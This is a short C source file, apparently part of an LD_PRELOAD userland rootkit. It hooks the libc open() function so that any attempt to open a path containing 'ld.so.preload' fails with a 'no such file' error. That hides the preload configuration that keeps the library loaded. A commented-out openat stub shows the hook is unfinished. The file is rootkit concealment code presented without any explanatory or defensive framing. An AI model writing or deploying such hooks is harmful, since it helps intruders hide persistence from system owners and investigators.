#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>

int open(const char *pathname, int flags, ...) {
  int (*r_open)(const char *pathname, int flags, ...) = dlsym(RTLD_NEXT, "open");
  va_list args;
  va_start(args, flags);
  int output = r_open(pathname, flags, va_arg(args, int));
  if (strstr(pathname, "ld.so.preload")) {
    close(output);
    errno = 2;
    return -1;
  }
  va_end(args);
  return output;
}

// int openat(int dirfd, const char *pathname, int flags, mode_t mode){
//   // int (*r_openat)(int dirfd, const char *pathname, int flags, mode_t mode) = dlsym(RTLD_NEXT, "openat");

//   // int output = r_openat(dirfd, pathname, flags, mode);
//   // write(1, "OPEN AT USED!\n", 15);
//   // printf("OPEN AT HAS BEEN USEEED -------------- \n");
//   // fflush(stdout);
//   return -1;

// }

 

